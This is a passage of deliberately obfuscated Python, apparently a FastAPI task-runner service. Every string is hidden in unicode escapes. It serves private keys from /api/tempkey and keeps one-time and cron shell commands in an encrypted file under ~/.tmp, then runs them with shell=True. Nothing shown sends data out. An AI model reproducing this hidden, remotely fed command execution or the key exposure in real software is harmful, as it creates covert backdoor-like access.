    O0_var_936 = {codecs.decode('\\u0073\\u0068\\u0065\\u006c\\u006c', 'unicode_escape'): O0_var_935, codecs.decode('\\u0073\\u0074\\u0064\\u006f\\u0075\\u0074', 'unicode_escape'): subprocess.PIPE, codecs.decode('\\u0073\\u0074\\u0064\\u0065\\u0072\\u0072', 'unicode_escape'): subprocess.STDOUT, codecs.decode('\\u0073\\u0074\\u0064\\u0069\\u006e', 'unicode_escape'): subprocess.DEVNULL, codecs.decode('\\u0074\\u0069\\u006d\\u0065\\u006f\\u0075\\u0074', 'unicode_escape'): O0_var_934, codecs.decode('\\u0074\\u0065\\u0078\\u0074', 'unicode_escape'): True, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072\\u0073', 'unicode_escape'): codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape'), codecs.decode('\\u0063\\u0077\\u0064', 'unicode_escape'): O0_var_932}
    if O0_var_933:
        O0_var_936[codecs.decode('\\u0065\\u006e\\u0076', 'unicode_escape')] = {**os.environ, **O0_var_933}
    try:
        O0_var_937 = await asyncio.to_thread(subprocess.run, O0_var_931, **O0_var_936)
        return {codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074', 'unicode_escape'): O0_var_937.stdout, codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): O0_var_937.returncode, codecs.decode('\\u0074\\u0069\\u006d\\u0065\\u006f\\u0075\\u0074', 'unicode_escape'): False, codecs.decode('\\u0063\\u006d\\u0064', 'unicode_escape'): O0_var_931}
    except subprocess.TimeoutExpired as e:
        return {codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074', 'unicode_escape'): codecs.decode('\\u005b\\u0054\\u0049\\u004d\\u0045\\u004f\\u0055\\u0054\\u005d\\u000a', 'unicode_escape') + str(e.output or ''), codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): 124, codecs.decode('\\u0074\\u0069\\u006d\\u0065\\u006f\\u0075\\u0074', 'unicode_escape'): True, codecs.decode('\\u0063\\u006d\\u0064', 'unicode_escape'): O0_var_931}
    except Exception as e:
        return {codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074', 'unicode_escape'): codecs.decode('\\u005b\\u0045\\u0052\\u0052\\u004f\\u0052\\u005d\\u0020', 'unicode_escape') + str(str(e)), codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): -1, codecs.decode('\\u0074\\u0069\\u006d\\u0065\\u006f\\u0075\\u0074', 'unicode_escape'): False, codecs.decode('\\u0063\\u006d\\u0064', 'unicode_escape'): O0_var_931}

def _resolve_tempkey_format(O0_var_938: str) -> str:
    O0_var_939 = (O0_var_938 or codecs.decode('', 'unicode_escape')).strip().lower()
    if O0_var_939 in (codecs.decode('', 'unicode_escape'), codecs.decode('\\u0066\\u0075\\u006c\\u006c', 'unicode_escape')):
        return codecs.decode('\\u0066\\u0075\\u006c\\u006c', 'unicode_escape')
    if O0_var_939 == codecs.decode('\\u0073\\u0068\\u006f\\u0072\\u0074', 'unicode_escape'):
        return codecs.decode('\\u0073\\u0068\\u006f\\u0072\\u0074', 'unicode_escape')
    raise HTTPException(status_code=422, detail=codecs.decode('\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u0020\\u006d\\u0075\\u0073\\u0074\\u0020\\u0062\\u0065\\u0020\\u0027\\u0066\\u0075\\u006c\\u006c\\u0027\\u0020\\u006f\\u0072\\u0020\\u0027\\u0073\\u0068\\u006f\\u0072\\u0074\\u0027', 'unicode_escape'))

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0065\\u006d\\u0070\\u006b\\u0065\\u0079', 'unicode_escape'), response_model=TempKeyResponse)
async def O0_fn_33(request: Request, ttl: int=Query(Config.TEMPKEY_DEFAULT_TTL_HOURS, ge=1, le=Config.TEMPKEY_MAX_TTL_HOURS), format: str=Query(codecs.decode('', 'unicode_escape'), description=codecs.decode('\\u54cd\\u5e94\\u5bc6\\u94a5\\u7f16\\u7801\\u003a\\u0020\\u7f3a\\u7701\\u002f\\u0066\\u0075\\u006c\\u006c\\u003d\\u0050\\u0045\\u004d\\u002b\\u0068\\u0065\\u0078\\u0020\\u5168\\u683c\\u5f0f\\u002c\\u0020\\u0073\\u0068\\u006f\\u0072\\u0074\\u003d\\u77ed\\u683c\\u5f0f\\u0020\\u0028\\u0030\\u002e\\u0035\\u002e\\u0038\\u0029', 'unicode_escape'))):
    O0_var_940 = _resolve_tempkey_format(format)
    O0_var_941 = request.app.state.temp_key_manager
    O0_var_942 = O0_var_941.get_or_create(ttl)
    if O0_var_940 == codecs.decode('\\u0073\\u0068\\u006f\\u0072\\u0074', 'unicode_escape'):
        O0_var_943 = TempKeyEcdsaPair(private_key=O0_var_942[codecs.decode('\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0070\\u0072\\u0069\\u0076\\u0061\\u0074\\u0065\\u005f\\u0068\\u0065\\u0078', 'unicode_escape')], public_key=O0_var_942[codecs.decode('\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u005f\\u0062\\u0036\\u0034', 'unicode_escape')])
        O0_var_944 = TempKeyEciesPair(private_key=O0_var_942[codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0072\\u0069\\u0076\\u0061\\u0074\\u0065\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')], public_key=O0_var_942[codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u005f\\u0062\\u0036\\u0034', 'unicode_escape')])
    else:
        O0_var_943 = TempKeyEcdsaPair(private_key=O0_var_942[codecs.decode('\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0070\\u0072\\u0069\\u0076\\u0061\\u0074\\u0065\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')].strip(), public_key=O0_var_942[codecs.decode('\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')].strip())
        O0_var_944 = TempKeyEciesPair(private_key=O0_var_942[codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0072\\u0069\\u0076\\u0061\\u0074\\u0065\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')], public_key=O0_var_942[codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')])
    return TempKeyResponse(status=codecs.decode('\\u006f\\u006b', 'unicode_escape'), key_id=O0_var_942[codecs.decode('\\u006b\\u0065\\u0079\\u005f\\u0069\\u0064', 'unicode_escape')], ttl_seconds=O0_var_942[codecs.decode('\\u0074\\u0074\\u006c\\u005f\\u0073\\u0065\\u0063\\u006f\\u006e\\u0064\\u0073', 'unicode_escape')], created_at=datetime.utcfromtimestamp(O0_var_942[codecs.decode('\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0064\\u005f\\u0061\\u0074', 'unicode_escape')]).isoformat() + codecs.decode('\\u005a', 'unicode_escape'), expires_at=datetime.utcfromtimestamp(O0_var_942[codecs.decode('\\u0065\\u0078\\u0070\\u0069\\u0072\\u0065\\u0073\\u005f\\u0061\\u0074', 'unicode_escape')]).isoformat() + codecs.decode('\\u005a', 'unicode_escape'), ecdsa=O0_var_943, ecies=O0_var_944)

class TaskStore:
    MAGIC = codecs.decode('\\u006b\\u0069\\u0073\\u0061\\u006d\\u0061\\u002d\\u0073\\u0074\\u006f\\u0072\\u0065', 'unicode_escape')
    VERSION = 1

    def __init__(self):
        self.enabled = False
        self.locked = False
        self.path = None
        self.key = None
        self.last_saved_at = None
        self._lock = threading.Lock()
        self._resolve_config()

    @staticmethod
    def _home_dir():
        for O0_var_945 in (os.environ.get(codecs.decode('\\u0055\\u0053\\u0045\\u0052\\u0050\\u0052\\u004f\\u0046\\u0049\\u004c\\u0045', 'unicode_escape')), os.environ.get(codecs.decode('\\u0048\\u004f\\u004d\\u0045', 'unicode_escape')), os.path.expanduser(codecs.decode('\\u007e', 'unicode_escape'))):
            if O0_var_945 and os.path.isdir(O0_var_945):
                return O0_var_945
        return os.getcwd()

    def _resolve_config(self):
        O0_var_946 = os.getenv(codecs.decode('\\u004b\\u0053\\u0054\\u004f\\u0052\\u0045', 'unicode_escape'), codecs.decode('', 'unicode_escape')).strip()
        if O0_var_946.lower() in (codecs.decode('\\u006f\\u0066\\u0066', 'unicode_escape'), codecs.decode('\\u0030', 'unicode_escape'), codecs.decode('\\u006e\\u006f\\u006e\\u0065', 'unicode_escape'), codecs.decode('\\u0066\\u0061\\u006c\\u0073\\u0065', 'unicode_escape')):
            Logger.info(codecs.decode('\\u005b\\u0054\\u0061\\u0073\\u006b\\u0053\\u0074\\u006f\\u0072\\u0065\\u005d\\u0020\\U0001f4be\\u0020\\u004b\\u0053\\u0054\\u004f\\u0052\\u0045\\u003d\\u006f\\u0066\\u0066\\u002c\\u0020\\u4efb\\u52a1\\u6301\\u4e45\\u5316\\u5df2\\u663e\\u5f0f\\u5173\\u95ed', 'unicode_escape'))
            return
        O0_var_947 = os.getenv(codecs.decode('\\u004b\\u0053\\u0054\\u004f\\u0052\\u0045\\u005f\\u004b\\u0045\\u0059', 'unicode_escape'), codecs.decode('', 'unicode_escape')).strip()
        if not O0_var_946:
            O0_var_946 = os.path.join(self._home_dir(), codecs.decode('\\u002e\\u0074\\u006d\\u0070', 'unicode_escape'), codecs.decode('\\u0073\\u0074\\u006f\\u0072\\u0065\\u002e\\u0065\\u006e\\u0063', 'unicode_escape'))
        O0_var_948 = self._parse_key(O0_var_947)
        if O0_var_948 is None:
            if O0_var_947:
                Logger.error(codecs.decode('\\u005b\\u0054\\u0061\\u0073\\u006b\\u0053\\u0074\\u006f\\u0072\\u0065\\u005d\\u0020\\u274c\\u0020\\u004b\\u0053\\u0054\\u004f\\u0052\\u0045\\u005f\\u004b\\u0045\\u0059\\u0020\\u975e\\u6cd5\\u0020\\u0028\\u9700\\u0020\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u002f\\u0068\\u0065\\u0078\\u0020\\u7f16\\u7801\\u7684\\u0020\\u0033\\u0032\\u0020\\u5b57\\u8282\\u0029\\u002c\\u0020\\u4efb\\u52a1\\u6301\\u4e45\\u5316\\u4fdd\\u6301\\u5173\\u95ed', 'unicode_escape'))
            else:
                Logger.info(codecs.decode('\\u005b\\u0054\\u0061\\u0073\\u006b\\u0053\\u0074\\u006f\\u0072\\u0065\\u005d\\u0020\\U0001f4be\\u0020\\u004b\\u0053\\u0054\\u004f\\u0052\\u0045\\u005f\\u004b\\u0045\\u0059\\u0020\\u672a\\u8bbe\\u7f6e\\u002c\\u0020\\u4efb\\u52a1\\u6301\\u4e45\\u5316\\u672a\\u542f\\u7528', 'unicode_escape'))
            return
        self.path = O0_var_946
        self.key = O0_var_948
        self.enabled = True
        Logger.info(codecs.decode('\\u005b\\u0054\\u0061\\u0073\\u006b\\u0053\\u0074\\u006f\\u0072\\u0065\\u005d\\u0020\\U0001f4be\\u0020\\u4efb\\u52a1\\u6301\\u4e45\\u5316\\u5df2\\u542f\\u7528\\u003a\\u0020', 'unicode_escape') + str(self.path))

    @staticmethod
    def _parse_key(raw: str) -> Optional[bytes]:
        if not raw:
            return None
        import re
        try:
            if re.fullmatch(codecs.decode('\\u005b\\u0030\\u002d\\u0039\\u0061\\u002d\\u0066\\u0041\\u002d\\u0046\\u005d\\u007b\\u0036\\u0034\\u007d', 'unicode_escape'), raw):
                O0_var_949 = bytes.fromhex(raw)
                return O0_var_949 if len(O0_var_949) == 32 else None
            O0_var_950 = raw + codecs.decode('\\u003d', 'unicode_escape') * (-len(raw) % 4)
            O0_var_949 = base64.b64decode(O0_var_950, validate=True)
            return O0_var_949 if len(O0_var_949) == 32 else None
        except Exception:
            return None

    def load(self):
        if not self.enabled:
            return ([], {})
        with self._lock:
            try:
                if not os.path.isfile(self.path):
                    return ([], {})
                with open(self.path, codecs.decode('\\u0072', 'unicode_escape'), encoding=codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')) as O0_var_951:
                    O0_var_952 = O0_var_951.read().strip()
                if not O0_var_952:
                    return ([], {})
                O0_var_953 = CryptoManager.decrypt_data(O0_var_952, self.key)
                if O0_var_953 is None:
                    raise ValueError(codecs.decode('\\u89e3\\u5bc6\\u5931\\u8d25\\u0020\\u0028\\u5bc6\\u94a5\\u9519\\u8bef\\u6216\\u6570\\u636e\\u88ab\\u7be1\\u6539\\u0029', 'unicode_escape'))
                O0_var_954 = json.loads(O0_var_953)
                if not isinstance(O0_var_954, dict) or O0_var_954.get(codecs.decode('\\u006d\\u0061\\u0067\\u0069\\u0063', 'unicode_escape')) != self.MAGIC:
                    raise ValueError(codecs.decode('\\u006d\\u0061\\u0067\\u0069\\u0063\\u0020\\u4e0d\\u5339\\u914d', 'unicode_escape'))
                O0_var_955 = int(O0_var_954.get(codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'), 0))
                if O0_var_955 > self.VERSION:
                    self.locked = True
                    Logger.error(codecs.decode('\\u005b\\u0054\\u0061\\u0073\\u006b\\u0053\\u0074\\u006f\\u0072\\u0065\\u005d\\u0020\\u274c\\u0020\\u5b58\\u50a8\\u7248\\u672c\\u0020', 'unicode_escape') + str(O0_var_955) + codecs.decode('\\u0020\\u9ad8\\u4e8e\\u652f\\u6301\\u7248\\u672c\\u0020', 'unicode_escape') + str(self.VERSION) + codecs.decode('\\u002c\\u0020\\u4fdd\\u7559\\u539f\\u6587\\u4ef6\\u4e0d\\u8986\\u76d6\\u002c\\u0020\\u672c\\u6b21\\u4ee5\\u7a7a\\u4efb\\u52a1\\u542f\\u52a8\\u4e14\\u6301\\u4e45\\u5316\\u53ea\\u8bfb', 'unicode_escape'))
                    return ([], {})
                if O0_var_955 != self.VERSION:
                    raise ValueError(codecs.decode('\\u4e0d\\u652f\\u6301\\u7684\\u7248\\u672c\\u0020', 'unicode_escape') + str(O0_var_955))
                O0_var_956 = O0_var_954.get(codecs.decode('\\u0064\\u0061\\u0074\\u0061', 'unicode_escape')) or {}
                O0_var_957 = [str(O0_var_958) for O0_var_958 in O0_var_956.get(codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0061\\u0073\\u006b\\u0073', 'unicode_escape')) or []]
                O0_var_959 = {str(O0_var_960): str(O0_var_961) for O0_var_960, O0_var_961 in (O0_var_956.get(codecs.decode('\\u0063\\u0072\\u006f\\u006e\\u0074\\u0061\\u0073\\u006b\\u0073', 'unicode_escape')) or {}).items()}
                self.last_saved_at = O0_var_954.get(codecs.decode('\\u0073\\u0061\\u0076\\u0065\\u0064\\u005f\\u0061\\u0074', 'unicode_escape'))
                Logger.info(codecs.decode('\\u005b\\u0054\\u0061\\u0073\\u006b\\u0053\\u0074\\u006f\\u0072\\u0065\\u005d\\u0020\\U0001f4be\\u0020\\u5df2\\u6062\\u590d\\u6301\\u4e45\\u5316\\u4efb\\u52a1\\u003a\\u0020\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065\\u003d', 'unicode_escape') + str(len(O0_var_957)) + codecs.decode('\\u002c\\u0020\\u0063\\u0072\\u006f\\u006e\\u003d', 'unicode_escape') + str(len(O0_var_959)))
                return (O0_var_957, O0_var_959)
            except Exception as exc:
                self._quarantine(codecs.decode('\\u52a0\\u8f7d\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(exc))
                return ([], {})

    def _quarantine(self, reason: str):
        try:
            if self.path and os.path.isfile(self.path):
                O0_var_962 = str(self.path) + codecs.decode('\\u002e\\u0062\\u0061\\u0064\\u002d', 'unicode_escape') + str(time.time_ns())
                os.replace(self.path, O0_var_962)
                Logger.error(codecs.decode('\\u005b\\u0054\\u0061\\u0073\\u006b\\u0053\\u0074\\u006f\\u0072\\u0065\\u005d\\u0020\\u274c\\u0020', 'unicode_escape') + str(reason) + codecs.decode('\\u002c\\u0020\\u539f\\u6587\\u4ef6\\u5df2\\u9694\\u79bb\\u003a\\u0020', 'unicode_escape') + str(O0_var_962))
            else:
                Logger.error(codecs.decode('\\u005b\\u0054\\u0061\\u0073\\u006b\\u0053\\u0074\\u006f\\u0072\\u0065\\u005d\\u0020\\u274c\\u0020', 'unicode_escape') + str(reason))
        except OSError as exc:
            Logger.error(codecs.decode('\\u005b\\u0054\\u0061\\u0073\\u006b\\u0053\\u0074\\u006f\\u0072\\u0065\\u005d\\u0020\\u274c\\u0020', 'unicode_escape') + str(reason) + codecs.decode('\\u002c\\u0020\\u4e14\\u9694\\u79bb\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(exc))

    def save(self, O0_var_963, O0_var_964) -> bool:
        if not self.enabled or self.locked:
            return False
        O0_var_965 = None
        with self._lock:
            try:
                O0_var_966 = {codecs.decode('\\u006d\\u0061\\u0067\\u0069\\u0063', 'unicode_escape'): self.MAGIC, codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): self.VERSION, codecs.decode('\\u0073\\u0061\\u0076\\u0065\\u0064\\u005f\\u0061\\u0074', 'unicode_escape'): datetime.utcnow().strftime(codecs.decode('\\u0025\\u0059\\u002d\\u0025\\u006d\\u002d\\u0025\\u0064\\u0054\\u0025\\u0048\\u003a\\u0025\\u004d\\u003a\\u0025\\u0053\\u005a', 'unicode_escape')), codecs.decode('\\u0064\\u0061\\u0074\\u0061', 'unicode_escape'): {codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0061\\u0073\\u006b\\u0073', 'unicode_escape'): list(O0_var_963 or []), codecs.decode('\\u0063\\u0072\\u006f\\u006e\\u0074\\u0061\\u0073\\u006b\\u0073', 'unicode_escape'): dict(O0_var_964 or {})}}
                O0_var_967 = json.dumps(O0_var_966, ensure_ascii=False).encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
                O0_var_968 = CryptoManager.encrypt_data(O0_var_967, self.key)
                O0_var_969 = os.path.dirname(os.path.abspath(self.path))
                if O0_var_969:
                    os.makedirs(O0_var_969, exist_ok=True)
                O0_var_965 = str(self.path) + codecs.decode('\\u002e\\u0074\\u006d\\u0070\\u002d', 'unicode_escape') + str(os.getpid())
                with open(O0_var_965, codecs.decode('\\u0077', 'unicode_escape'), encoding=codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')) as O0_var_970:
                    O0_var_970.write(O0_var_968)
                    O0_var_970.flush()
                    os.fsync(O0_var_970.fileno())
                os.replace(O0_var_965, self.path)
                self.last_saved_at = O0_var_966[codecs.decode('\\u0073\\u0061\\u0076\\u0065\\u0064\\u005f\\u0061\\u0074', 'unicode_escape')]
                return True
            except Exception as exc:
                Logger.error(codecs.decode('\\u005b\\u0054\\u0061\\u0073\\u006b\\u0053\\u0074\\u006f\\u0072\\u0065\\u005d\\u0020\\u274c\\u0020\\u4fdd\\u5b58\\u5931\\u8d25\\u0020\\u0028\\u5185\\u5b58\\u4efb\\u52a1\\u4e0d\\u53d7\\u5f71\\u54cd\\u0029\\u003a\\u0020', 'unicode_escape') + str(exc))
                try:
                    if O0_var_965 and os.path.isfile(O0_var_965):
                        os.remove(O0_var_965)
                except Exception:
                    pass
                return False

class TaskManager:
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u4efb\\u52a1\\u7ba1\\u7406\\u5668\\u0020\\u002d\\u0020\\u5185\\u5b58\\u5b58\\u50a8\\u0020\\u002b\\u0020\\u52a0\\u5bc6\\u6301\\u4e45\\u5316\\u0020\\u0028\\u0030\\u002e\\u0035\\u002e\\u0037\\u002c\\u0020\\u0064\\u006f\\u0063\\u0073\\u002f\\u0041\\u0050\\u0049\\u002e\\u004d\\u0044\\u0020\\u5341\\u4e09\\u0029\\u002c\\u0020\\u52a8\\u6001\\u6267\\u884c\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u542f\\u52a8\\u4efb\\u52a1\\u003a\\u0020\\u4e00\\u6b21\\u6027\\u6267\\u884c\\uff0c\\u6267\\u884c\\u540e\\u81ea\\u52a8\\u6e05\\u9664\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u5b9a\\u65f6\\u4efb\\u52a1\\u003a\\u0020\\u0043\\u0072\\u006f\\u006e\\u0074\\u0061\\u0062\\u0020\\u8868\\u8fbe\\u5f0f\\u8c03\\u5ea6\\uff0c\\u540e\\u53f0\\u5faa\\u73af\\u68c0\\u67e5\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')

    def __init__(self, timeout: int=300, check_interval: int=30, O0_var_971: int=None):
        self.timeout = timeout
        self.check_interval = check_interval
        self.max_log_size = O0_var_971 or Config.MAX_TASK_LOG_SIZE
        Config.onetimetasks_log = deque(Config.onetimetasks_log, maxlen=self.max_log_size)
        Config.crontasks_log = deque(Config.crontasks_log, maxlen=self.max_log_size)
        self._cron_task: Optional[asyncio.Task] = None
        self._running = False
        self._executed_crons: set = set()
        self.store = TaskStore()
        try:
            O0_var_972, O0_var_973 = self.store.load()
        except Exception as exc:
            Logger.error(codecs.decode('\\u005b\\u0054\\u0061\\u0073\\u006b\\u0053\\u0074\\u006f\\u0072\\u0065\\u005d\\u0020\\u274c\\u0020\\u6062\\u590d\\u5f02\\u5e38\\u0020\\u0028\\u4ee5\\u7a7a\\u4efb\\u52a1\\u542f\\u52a8\\u0029\\u003a\\u0020', 'unicode_escape') + str(exc))
            O0_var_972, O0_var_973 = ([], {})
        if O0_var_972:
            Config.onetasks = O0_var_972
        if O0_var_973:
            Config.crontasks = O0_var_973

    def set_onetime_tasks(self, O0_var_974: List[str]) -> dict:
        Config.onetasks = O0_var_974 if O0_var_974 else []
        O0_var_975 = {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(Config.onetasks), codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u0073', 'unicode_escape'): Config.onetasks}
        O0_var_975[codecs.decode('\\u0070\\u0065\\u0072\\u0073\\u0069\\u0073\\u0074\\u0065\\u0064', 'unicode_escape')] = self.store.save(Config.onetasks, Config.crontasks)
        return O0_var_975

    def get_onetime_tasks(self) -> dict:
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(Config.onetasks), codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u0073', 'unicode_escape'): Config.onetasks}

    def run_onetime_tasks(self) -> List[dict]:
        if not Config.InitTask or not Config.onetasks:
            return []
        O0_var_976 = []
        O0_var_977 = Config.onetasks.copy()
        for O0_var_978, O0_var_979 in enumerate(O0_var_977):
            O0_var_980 = datetime.utcnow()
            try:
                if Config.DEBUG:
                    Logger.debug(codecs.decode('\\U0001f680\\u0020\\u005b\\u004f\\u006e\\u0065\\u0054\\u0069\\u006d\\u0065\\u002d', 'unicode_escape') + str(O0_var_978 + 1) + codecs.decode('\\u005d\\u0020\\u0045\\u0078\\u0065\\u0063\\u0075\\u0074\\u0069\\u006e\\u0067\\u003a\\u0020', 'unicode_escape') + str(O0_var_979[:100]) + codecs.decode('\\u002e\\u002e\\u002e', 'unicode_escape'))
                O0_var_981 = subprocess.run(O0_var_979, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL, timeout=self.timeout, text=True, errors=codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape'))
                O0_var_982 = O0_var_981.stdout[:2000]
                O0_var_983 = O0_var_981.returncode
                O0_var_984 = self._format_log_entry(O0_var_979, O0_var_982, O0_var_983, codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'))
                Config.onetimetasks_log = self._append_task_log(Config.onetimetasks_log, O0_var_984, self.max_log_size)
                O0_var_976.append({codecs.decode('\\u0069\\u006e\\u0064\\u0065\\u0078', 'unicode_escape'): O0_var_978, codecs.decode('\\u0063\\u006d\\u0064', 'unicode_escape'): O0_var_979[:200], codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): O0_var_983, codecs.decode('\\u006f\\u0075\\u0074\\u0070\\u0075\\u0074', 'unicode_escape'): O0_var_982[:500], codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape')})
            except subprocess.TimeoutExpired as e:
                O0_var_982 = codecs.decode('\\u005b\\u0054\\u0049\\u004d\\u0045\\u004f\\u0055\\u0054\\u005d\\u0020', 'unicode_escape') + str(e.output[:500] if e.output else '')
                O0_var_983 = 124
                O0_var_984 = self._format_log_entry(O0_var_979, O0_var_982, O0_var_983, codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'))
                Config.onetimetasks_log = self._append_task_log(Config.onetimetasks_log, O0_var_984, self.max_log_size)
                O0_var_976.append({codecs.decode('\\u0069\\u006e\\u0064\\u0065\\u0078', 'unicode_escape'): O0_var_978, codecs.decode('\\u0063\\u006d\\u0064', 'unicode_escape'): O0_var_979[:200], codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): O0_var_983, codecs.decode('\\u006f\\u0075\\u0074\\u0070\\u0075\\u0074', 'unicode_escape'): O0_var_982[:500], codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0074\\u0069\\u006d\\u0065\\u006f\\u0075\\u0074', 'unicode_escape')})
            except Exception as e:
                O0_var_982 = codecs.decode('\\u005b\\u0045\\u0052\\u0052\\u004f\\u0052\\u005d\\u0020', 'unicode_escape') + str(type(e).__name__) + codecs.decode('\\u003a\\u0020', 'unicode_escape') + str(str(e))
                O0_var_983 = -1
                O0_var_984 = self._format_log_entry(O0_var_979, O0_var_982, O0_var_983, codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'))
                Config.onetimetasks_log = self._append_task_log(Config.onetimetasks_log, O0_var_984, self.max_log_size)
                O0_var_976.append({codecs.decode('\\u0069\\u006e\\u0064\\u0065\\u0078', 'unicode_escape'): O0_var_978, codecs.decode('\\u0063\\u006d\\u0064', 'unicode_escape'): O0_var_979[:200], codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): O0_var_983, codecs.decode('\\u006f\\u0075\\u0074\\u0070\\u0075\\u0074', 'unicode_escape'): O0_var_982, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape')})
        Config.InitTask = False
        if Config.DEBUG:
            Logger.debug(codecs.decode('\\u2705\\u0020\\u005b\\u004f\\u006e\\u0065\\u0054\\u0069\\u006d\\u0065\\u005d\\u0020\\u0043\\u006f\\u006d\\u0070\\u006c\\u0065\\u0074\\u0065\\u0064\\u0020', 'unicode_escape') + str(len(O0_var_976)) + codecs.decode('\\u0020\\u0074\\u0061\\u0073\\u006b\\u0073\\u002c\\u0020\\u006c\\u006f\\u0067\\u0067\\u0065\\u0064\\u0020\\u0074\\u006f\\u0020\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065\\u0074\\u0061\\u0073\\u006b\\u0073\\u005f\\u006c\\u006f\\u0067', 'unicode_escape'))
        return O0_var_976

    async def _check_and_run_cron(self):
        if not Config.crontasks:
            return
        O0_var_985 = datetime.now()
        for O0_var_986, O0_var_987 in Config.crontasks.items():
            try:
                O0_var_988 = croniter(O0_var_986, O0_var_985)
                O0_var_989 = O0_var_988.get_prev(datetime)
                O0_var_990 = (O0_var_985 - O0_var_989).total_seconds()
                if 0 <= O0_var_990 <= self.check_interval + 5:
                    O0_var_991 = O0_var_989.strftime(codecs.decode('\\u0025\\u0059\\u0025\\u006d\\u0025\\u0064\\u0025\\u0048\\u0025\\u004d', 'unicode_escape'))
                    O0_var_992 = str(O0_var_986) + codecs.decode('\\u003a', 'unicode_escape') + str(O0_var_987) + codecs.decode('\\u003a', 'unicode_escape') + str(O0_var_991)
                    O0_var_993 = hashlib.md5(O0_var_992.encode()).hexdigest()[:10]
                    if O0_var_993 in self._executed_crons:
                        continue
                    if Config.DEBUG:
